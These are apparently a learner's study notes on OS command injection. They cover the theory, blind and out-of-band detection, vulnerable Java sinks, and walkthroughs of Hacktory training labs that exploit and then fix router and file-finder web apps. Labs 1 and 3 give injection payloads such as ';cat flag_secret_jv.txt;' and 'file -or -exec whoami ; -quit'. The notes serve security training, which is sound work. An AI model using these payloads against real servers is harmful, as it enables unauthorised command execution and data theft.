# Code and command injections.md
## Theory
### Command Injection
#### Vulnerability:Command injection is a type of vulnerability that enables the adversary to execute arbitrary OS commands on the server through susceptible applications ,These attacks are possible usually because of insufficient input validation.
- How it works? :
+ Let's suppose we have the vuln.com website with the following code:
- `Runtime rt = Runtime.getRuntime();
- `Process proc = rt.exec(new String[] {"sh", "-c", "ping " +req.getParameter("ip")});`
+ he script calls the ping utility that sends requests to an IP address that is passed to the script as an argument. Here's an example of a call for the script with an argument `ip=8.8.8.8`

`vuln.com/ping?ip=8.8.8.8`
The result:

`sh -c ping 8.8.8.8`
+However, if the user passes the 123;whoami value as an argument, the formed command will look like this:

`sh -c ping 123;whoami`
##### How to find it?:
- The results of an injection may not be present in the server response. There are three basic situations:
- The result is in the server response.
- The result is not in the response, but we can tell if the injection was executed using indirect evidence right away.
- The result is not in the response, but we can tell if the injection was executed using indirect evidence after some time.

### Blind injection:
The result of command execution is not always displayed on the page (blind injection). In this case, there are only indirect signs a command was executed (sleep, request to (our) external resource, etc.). One way or another, sleep, ping, and other commands that would take time for their execution, which can be traced.

- Out-of-band : In some cases, we cannot use response delay to see if our command was executed. Thus, you have to make the vulnerable server perform a certain action. For example, make a DNS request with a specific host or initiate a request from the vulnerable

### Search in the source code
- |PHP	|system, shell_exec, exec, proc_open, popen, eval, passthru|
- |NodeJS	|spawn, forc, exec, eval|
- |Java	|ProcessBuilder, Runtime.exec|
- |C#	|ProcessStartInfo,ParameterizedThreadStart,Process.Start,Exec|
## Fixes and prevention
List of characters to be filtered:
`< > & * ‘ | = ? ; [ ] ^ ~ ! . ” % @ / \ : + , '`
#### An example:
- `Runtime rt = Runtime.getRuntime();`
- `Process proc = rt.exec(new String[] {"sh", "-c", "ping " + req.getParameter("ip")});`
#### Bad example:
-`String command="ping "+req.getParameter("ip");`
-`ProcessBuilder b = new ProcessBuilder(command);`
#### Good example:
`ProcessBuilder b = new ProcessBuilder("ping",req.getParameter("ip"));`


## Lab 1:RouterV1
We are going to work with a router configuration web interface. We will find command injection vulnerabilities and get secret information.
- Run the machine
- open the browoser and put the adress http://www.hacktory.lab
- go for the admin pannel
- in the hostane field ping
- The output is ping -c 1 ping
- now in the field we should type ping -c 1 127.0.0.1
- in the hostbname field put ;ls;
- the output will be like bindemo-baseetcflag_secret_jv.txtliblicense-eplv10-.........
- we can see the flag_secret_jv.txt
- now we should use this command ;cat flag_secret_jv.txt;
- we can see in the output the flag // java_rce_attack
- close the machien
## Lab 2:RouterV1 
Нам предстоит исправить уязвимости в веб-интерфейсе конфигурации роутера, которые мы обнаружили ранее.
- Open the machine
- Go to Code editor
- the first thing is checking the Admin.java
- Direclty without thinking twice  we can see that that problem in the
- `Process proc = rt.exec(new String[] {"sh", "-c", "ping -c 1 " + req.getParameter("cmd")});`

why? because we are using sh-c this will open the shell direclty and we are passing the user input direclty into the shell
lets fix this
    `String cmdParam = req.getParameter("cmd");
    // Basic input validation
    if (cmdParam == null || cmdParam.contains(";") || cmdParam.contains("&") || cmdParam.contains("|")) {
        req.setAttribute("output", "Invalid input detected.");
        this.doGet(req, resp);
        return;
    }`

- after this i used the hint to know where the 2 problem 
`processBuilder.command("bash", "-c", "nslookup " + request.getAttribute("cmd"));`
- dont use the bash-c lets use safe argument separation `processBuilder.command("nslookup", (String)request.getAttribute("cmd"));`

- we can use input validation as we did in the admin java its good
- after correcting use the deploy adn the flag will be shown in the output of the console 
//Your flag is: JAVA_RCE_DEFENDER

## Lab 3:FFF:
We are going to work with the FFF (fast file finder) website and try to inject a command through its search bar. We will need the knowledge about some command arguments.

- Start you machine 
- Go to http://www.hacktory.lab
- try find -help
- the question is Which argument of the find command could be potentially used by an attacker ?
- the answer is -exec
- try to enter file -or -exec whoami ; -quit
- the output is root
- try file -or -exec ls ; -quit.
- we can see the list of the files
- and we can see a file called flag.txt
- we wanna see the content of this i am thinking in the command of cat
- `;cat flag.txt;` i didnt get any result 
- try this command `file -or -exec cat flag.txt ; -quit`
- the flag  ` **java_rce_find_escaper**`
- close your machine
- Good luck from kader
    
## Lab 4:FFF:
Now it's time to fix the vulnerabilities of FFF (fast file finder)!
- open your machine
- open code editor
- locate the main.jave source code
- analyse it
- we can see direclty the mistake in
- `Process proc = Runtime.getRuntime().exec("find /sources/ -name " + filename);`
- this allow the command ;cat;
- fix the code
package org.hacktory;
`import javax.servlet.RequestDispatcher;`
`import javax.servlet.ServletException;`
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
public class Main extends HttpServlet {
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        String filename = req.getParameter("filename");
        StringBuilder output = new StringBuilder();

        // Basic input validation: only allow safe characters
        if (filename == null || !filename.matches("^[a-zA-Z0-9._-]+$")) {
            output.append("Invalid filename.");
        } else {
            try {
                ProcessBuilder pb = new ProcessBuilder("find", "/sources/", "-name", filename);
                Process proc = pb.start();

                BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
                String s;

                while ((s = stdInput.readLine()) != null) {
                    output.append(s).append("<br/>");
                }

                while ((s = stdError.readLine()) != null) {
                    output.append(s).append("<br/>");
                }
            } catch (IOException e) {
                output.append("Error running find: ").append(e.getMessage());
            }
        }

        req.setAttribute("output", output.toString());
        this.doGet(req, resp);
    }
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        RequestDispatcher requestDispatcher = req.getRequestDispatcher("/WEB-INF/view/index.jsp");
        requestDispatcher.forward(req, resp);
    }
}
- deploy your code
- the flag is JAVA_RCE_ARGUMENT_SOLVER




